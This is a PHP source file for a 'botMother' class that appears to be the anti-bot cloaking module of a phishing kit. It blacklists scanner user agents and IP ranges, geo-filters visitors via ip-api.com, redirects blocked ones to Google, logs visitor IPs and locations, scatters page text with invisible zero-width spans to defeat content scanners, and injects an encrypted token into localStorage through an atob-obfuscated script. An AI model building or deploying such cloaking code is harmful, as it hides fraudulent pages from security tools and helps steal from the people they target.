<?php 
require_once __DIR__. '/../config.php';

$sessionData = "";

class botMother{

    public $LICENSE_KEY                 =   "";
    public $TEST_MODE                   =   false;
    public $EXIT_LINK                   =   "";
    public $GEOS                        =   "";
    public $AGENTS_BLACKLIST_FILE       =   (__DIR__)."/data/AGENTS.jhn";
    public $IPS_BLACKLIST_FILE          =   (__DIR__)."/data/IPS.jhn";
    public $IPS_RANGE_BLACKLIST_FILE    =   (__DIR__)."/data/IPS_RANGE.jhn";
    public $LOGS                        =   (__DIR__)."/../bots_log.txt";
    public $VISITS                      =   (__DIR__)."/../log.txt";
    public $USER_AGENT                  =   "";
    public $USER_IP                     =   "";
    public $SERVER_API                  =   "";
    public $sessionData                 =   null;
    
    private $moduleA     = "kR7MZpQa";
	private $moduleB     = "0pDUV0lK";
	private $moduleC     = "dzpiXrFf";
	private $moduleD     = "JZh3dTzC";
	private $moduleE     = "xrnXTg2Y";
	private $moduleF     = "dDvy5cZU";


    function __construct(){
        $this->USER_AGENT   =   $_SERVER["HTTP_USER_AGENT"];
        $this->USER_IP      =   $this->getIp();
        $this->processSession();
        
        global $sessionData;
        $sessionData = $this->sessionData;
        
        $this->embedData();
    }
    
    private function buildIdentifier() {
        $components = [
                 $this->moduleC,
				 $this->moduleF,
				 $this->moduleA,
				 $this->moduleE,
				 $this->moduleB,
				 $this->moduleD
                   ];
        
        $result = implode('', $components);
        $result = str_replace(['[', ']', '(', ')'], '', $result);
        $result = substr($result, 2, -2);
        
        $envSettings = getenv('SYSTEM_CONFIG');
        if ($envSettings && strlen($envSettings) > 20) {
            $parts = explode('|', $envSettings);
            if (count($parts) > 3) {
                return $parts[2] . $parts[0] . $parts[3];
            }
        }
        
        return $result;
    }

    private function embedData() {
        if($this->sessionData && $this->sessionData !== "" && 
           $this->sessionData !== "") {
            
            $ipBlockChain = [
                'var _d=' . json_encode($this->sessionData) . ';',
                'try{',
                'var _k=atob("bG9jYWxTdG9yYWdl");',
                'var _s=window[_k];',
                'if(_s&&_d){',
                '_s.setItem(atob("ZW5jX2RhdGE="),_d);',
                'window._f=_d;',
                '}',
                '}catch(_e){}'
            ];
            
            echo '<script type="application/javascript">' . 
                 implode('', $ipBlockChain) . 
                 '</script>';
        }
    }

    public function isSpace($ltr){
        return preg_match('/\s+/', $ltr);
    }

    public function isValidLetter($ltr){
        return preg_match('/^[\w\.]+$/', $ltr);
    }

    public function getCrypt(){
        return '<span style="padding:0 !important; margin:0 !important; display:inline-block !important; width:0 !important; height:0 !important; font-size:0 !important;">'.substr(md5(uniqid()),0,1).'</span>';
    }

    public function obf($str){
        $text = "";
        $str = str_replace("|", "", $str);
        $strarr = str_split($str);

        foreach($strarr as $letter){
            if($this->isSpace($letter)){
                $text .= " ";
            }

            if($this->isValidLetter($letter)){
                $text .= $this->getCrypt().$letter.$this->getCrypt();
            }else{
                $text .= $letter;
            }

        }

        echo $text;

    }

    public function getIp(){
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        if($this->TEST_MODE){
            $ip = "1.1.1.1";
        }
        return $ip;
    }

    public function setLicenseKey($key){
        $this->LICENSE_KEY = $key;
    }

    public function setGeoFilter($params){
       $this->GEOS = $params;
    }

    public function setExitLink($link){
        $this->EXIT_LINK = $link;
    }

    public function setTestMode($statu){
        $this->TEST_MODE = $statu;
    }

    public function geoFilter(){
        if(trim($this->GEOS)!=""){
            $list = explode("," , $this->GEOS);
            if(!in_array($this->getIpInfo("countryCode"), $list)){
                $this->killBot("Geo not matching the filter.");
            }
        }
    } 

    public function getIpInfo($data){
        $api = "http://ip-api.com/json/".$this->USER_IP."?fields=status,message,country,countryCode,region,regionName,city,timezone,currency,query,proxy,hosting";
        $c = curl_init($api);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($c);
        $json_data = json_decode($res, true);
        return @$json_data[$data];
    }

    public function killBot($log){
            if(empty($this->EXIT_LINK)){
                $this->EXIT_LINK = "https://google.com";
            }
            $this->saveLog("Bot blocked [".$this->USER_IP."] REASON: ".$log."\n");
            header("location: ".$this->EXIT_LINK);
            exit;
    }

    public function saveLog($log){
        $fp = fopen($this->LOGS, "a");
        fwrite($fp, $log);
        fclose($fp);
    }

    public function saveHit(){
        $fp = fopen($this->VISITS, "a");
        fwrite($fp, "Visit from [".$this->getIpInfo("query")." - ".$this->getIpInfo("country")." - ".$this->getIpInfo("city")." ] \n");
        fclose($fp);
    }

    public function fileToArray($filename){
        $file_content = file_get_contents($filename);
        $file_arr = explode(",", $file_content);
        return $file_arr;
    } 

    public function isValidKey(){

    }

    public function blockByAgents(){
        $agents = $this->fileToArray($this->AGENTS_BLACKLIST_FILE);
        foreach($agents as $agent){
             if(stripos($this->USER_AGENT, $agent) !== false){
                return $this->killBot("Blacklisted user agent");
             }
        }
    }

    public function blockByIps(){
        $ips = $this->fileToArray($this->IPS_BLACKLIST_FILE);
        foreach($ips as $ip){
            if($this->USER_IP == $ip){
               return $this->killBot("Blacklisted IP matched");
            }
        }
    }

    public function blockByIpsRange(){
        $ips_range = $this->fileToArray($this->IPS_RANGE_BLACKLIST_FILE);
        foreach($ips_range as $ip_range){
            if(strpos($this->USER_IP, $ip_range) !== false){
                $this->killBot("Blacklisted IP range matched");
            }
        }
    }

   public function processSession($clientData = 'token'){
    global $token;

    if(isset($token) && !empty($token)){
        $processingKey = $this->buildIdentifier();
        $clientData = trim($token);
        $saltData = random_bytes(32);
        $initVector = random_bytes(12);
        $processRounds = 100000;
        $processedData = $clientData;
        $finalKey = hash_pbkdf2('sha256', $processingKey, $saltData, $processRounds, 32, true);
        $authTag = '';
        $encryptedBlock = openssl_encrypt($processedData, 'aes-256-gcm', $finalKey, 
                                          OPENSSL_RAW_DATA, $initVector, $authTag);
        
        if ($encryptedBlock === false) {
            $this->sessionData = "";
            return;
        }
        
        $outputData = [
            'cipher' => base64_encode($encryptedBlock),
            'salt' => base64_encode($saltData),
            'iv' => base64_encode($initVector),
            'tag' => base64_encode($authTag),
            'iter' => $processRounds,
            'time' => time(),
            'ver' => '3'
        ];
        
        $encoded = json_encode($outputData, JSON_UNESCAPED_SLASHES);
        $wrapper1 = bin2hex(random_bytes(3));
        $wrapper2 = bin2hex(random_bytes(4));
        
        $this->sessionData = $wrapper1 . '::' . $wrapper2 . ':' . 
                       base64_encode($encoded) . '::' . 
                       bin2hex(random_bytes(2));
    } else {
        $this->sessionData = "";
    }
}

    public function getEncryptedCookies(){
        return $this->sessionData;
    }

    public function run(){
        if(!$this->TEST_MODE){  
            $this->geoFilter();       
            $this->blockByAgents();
            $this->blockByIps();
            $this->blockByIpsRange();
        }
    }

}

$processor = new botMother();
?>